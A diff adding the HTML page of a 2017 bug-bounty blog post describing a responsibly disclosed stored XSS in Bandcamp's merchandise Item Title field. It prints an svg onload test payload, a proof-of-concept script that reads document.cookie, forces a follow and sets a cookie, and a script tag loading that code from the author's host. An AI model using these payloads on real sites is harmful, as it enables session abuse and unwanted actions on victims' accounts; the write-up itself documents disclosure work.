@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  
+  
+  <title>Stored XSS in BandCamp</title>
+  <meta name="description" content="        Recently, while my friend Alyssa Herrera and I were collaborating on finding ffmpeg vulnerabilities in bug bounty programs, we came to learn that Bandcamp ran a bug bounty program. If you have never heard of BandCamp, it is essentially a platform that allows artists, fans, and labels to interact, connect, and support each other. I instantly was curious to see what I could find, so I signed up for an artist account and created a Bandcamp page. The first function I started to test was the Add Music function. This part of the site allows artists to add albums and tracks. I tested for IDOR and XSS, but sadly it wasn’t vulnerable to either. The next function I thought I wanted to test was the Add Merch function. There were 2 main parameters in this function that I wanted to test for XSS in immediately. I wanted to see if either the Item Title or Description accepted / rendered any HTML. I put in a simple XSS payload for both: &amp;lt;svg/onload=confirm(0)&amp;gt; I saved and published the new “merchandise”, and voila: NOTHING happened. It was sanitized and I was bummed that it didn’t work. Then I saw the Buy Now button, so I clicked it, which opened a new frame and my XSS fired! They were not correctly sanitizing the Item Title in this frame, thus allowing an attacker to simply insert any HTML or javascript. I am always reluctant in submitting an XSS with merely alert() because it just shows I was too lazy to actually come up with a cool proof-of-concept. With that in mind, I came up with this POC: alert(&quot;Stored XSS on BandCamp&quot;); alert(&quot;Your cookies: &quot; + document.cookie); document.getElementById(&quot;follow-unfollow&quot;).click();alert(&quot;Thanks for the follow :^D&quot;); document.cookie=&quot;hacker=cdl;path=/;domain=.bandcamp.com&quot;; Then changed the Item Title to &amp;lt;script src=//sxcurity.pro/bandcamp.js&amp;gt;&amp;lt;/script&amp;gt; which made the victim follow me and set the cookie “hacker” to “cdl” for bandcamp.com and all subdomains in their browser! Proof of concept video: Timeline (6/29/2017) Reported XSS to Bandcamp via Email (6/30/2017) Confirmed, Patched, &amp;amp; Awarded with a $500 bounty! Thanks for reading, Corben Douglas (@sxcurity) https://hackerone.com/cdl https://twitter.com/sxcurity https://bugcrowd.com/c https://github.com/sxcurity">
+  
+
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="http://hack-r.be:4000/2017/06/30/bandcamp-xss/">
+  
+  
+  <link rel="alternate" type="application/rss+xml" title="sxcurity.pro" href="http://hack-r.be:4000/feed.xml">
+
+  
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="sxcurity">
+  <meta name="twitter:title" content="Stored XSS in BandCamp">
+  <meta name="twitter:description" content="        Recently, while my friend Alyssa Herrera and I were collaborating on finding ffmpeg vulnerabilities in bug bounty programs, we came to learn that Bandcamp ran a bug bounty program. If you h...">
+  
+    <meta name="twitter:creator" content="sxcurity">
+  
+  
+
+  <script type="text/javascript">
+  WebFontConfig = {
+    google: { families: [ 'Bitter:400,700,400italic:latin' ] }
+  };
+  (function() {
+    var wf = document.createElement('script');
+    wf.src = ('https:' == document.location.protocol ? 'https' : 'http') +
+      '://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js';
+    wf.type = 'text/javascript';
+    wf.async = 'true';
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(wf, s);
+  })();
+</script>
+
+  
+
+</head>
+
+
+  <body>
+
+    <header class="site-header" style="background-image: url(/images/coffee.jpg)">
+
+  <div class="wrapper">
+    <a class="site-title" style="text-decoration:none" href="/"><img height="30px" width="30px" src="/icon.svg"/>&nbsp;sxcurity.pro</a>
+
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">[ About ]</a>
+      
+        
+        <a class="page-link" href="/archives/">[ Archives ]</a>
+      
+        
+        <a class="page-link" href="/advisories">[ Advisories ]</a>
+      
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    
+      <h1 class="post-title" itemprop="name headline">Stored XSS in BandCamp</h1>
+    
+    <p class="post-meta"><time datetime="2017-06-30T00:00:00+00:00" itemprop="datePublished">Jun 30, 2017</time></p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <p>        Recently, while my friend <a href="https://twitter.com/_psycho_mantis" rel="noopener noreferrer" style="color:#DC0739;text-decoration:none;"><b>Alyssa Herrera</b></a> and I were collaborating on finding ffmpeg vulnerabilities in bug bounty programs, we came to learn that <strong>Bandcamp</strong> ran a bug bounty program. If you have never heard of BandCamp, it is essentially a platform that allows artists, fans, and labels to interact, connect, and support each other.</p>
+
+<p>I instantly was curious to see what I could find, so I signed up for an artist account and created a Bandcamp page. The first function I started to test was the <strong>Add Music</strong> function. This part of the site allows artists to add albums and tracks. I tested for IDOR and XSS, but sadly it wasn’t vulnerable to either.</p>
+
+<p>The next function I thought I wanted to test was the <strong>Add Merch</strong> function. There were 2 main parameters in this function that I wanted to test for XSS in immediately. I wanted to see if either the <em>Item Title</em> or <em>Description</em> accepted / rendered any HTML.
+I put in a simple XSS payload for both:  <code class="highlighter-rouge">&lt;svg/onload=confirm(0)&gt;</code></p>
+
+<p>I saved and published the new “merchandise”, and voila:
+NOTHING happened. It was sanitized and I was bummed that it didn’t work.
+Then I saw the <strong>Buy Now</strong> button, so I clicked it, which opened a new frame and my XSS fired! They were not correctly sanitizing the <strong>Item Title</strong> in this frame, thus allowing an attacker to simply insert any HTML or javascript.</p>
+
+<p>I am always reluctant in submitting an XSS with merely alert() because it just shows I was too lazy to actually come up with a cool proof-of-concept. 
+With that in mind, I came up with this POC:</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">alert</span><span class="p">(</span><span class="s2">"Stored XSS on BandCamp"</span><span class="p">);</span>
+<span class="nx">alert</span><span class="p">(</span><span class="s2">"Your cookies: "</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"follow-unfollow"</span><span class="p">).</span><span class="nx">click</span><span class="p">();</span><span class="nx">alert</span><span class="p">(</span><span class="s2">"Thanks for the follow :^D"</span><span class="p">);</span>
+<span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">=</span><span class="s2">"hacker=cdl;path=/;domain=.bandcamp.com"</span><span class="p">;</span>  
+</code></pre></div></div>
+<p>Then changed the <strong>Item Title</strong> to <code class="highlighter-rouge">&lt;script src=//sxcurity.pro/bandcamp.js&gt;&lt;/script&gt;</code>
+which made the victim follow me and set the cookie “hacker” to “cdl” for bandcamp.com and all subdomains in their browser!
+<br />Proof of concept video:</p>
+<iframe src="https://player.vimeo.com/video/224109910" width="640" height="360" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen=""></iframe>
+<p><br /></p>
+<h2><u>Timeline</u></h2>
+<ul>
+  <li>(6/29/2017) Reported XSS to Bandcamp via Email</li>
+  <li>(6/30/2017) Confirmed, Patched, &amp; Awarded with a $500 bounty!</li>
+</ul>
+
+<p><br />
+Thanks for reading,<br /><br />
+<strong>Corben Douglas</strong> (<font color="#E22A3C">@sxcurity</font>)</p>
+<ul>
+  <li>https://hackerone.com/cdl</li>
+  <li>https://twitter.com/sxcurity</li>
+  <li>https://bugcrowd.com/c</li>
+  <li>https://github.com/sxcurity</li>
+</ul>
+
+  </div>
+
+  
+    <div class="post-comments" itemprop="comment">
+      <hr />
+<h1>Comments</h1>
+<div id="disqus_thread"></div>
+<script>
+    /**
+     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+     */
+    
+  /* var disqus_config = function () {
+     this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+     this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    */
+    (function() {  // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        
+        s.src = 'https://sxcurity.disqus.com/embed.js';
+        
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+    </div>
+  
+
+</article>
+
+      </div>
+    </main>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <p>
+      
+
+&copy; Corben Douglas - Twitter: <a href="https://twitter.com/sxcurity">@sxcurity</a> - Subscribe via <a href="http://hack-r.be:4000/feed.xml">RSS</a>
+
+    </p>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
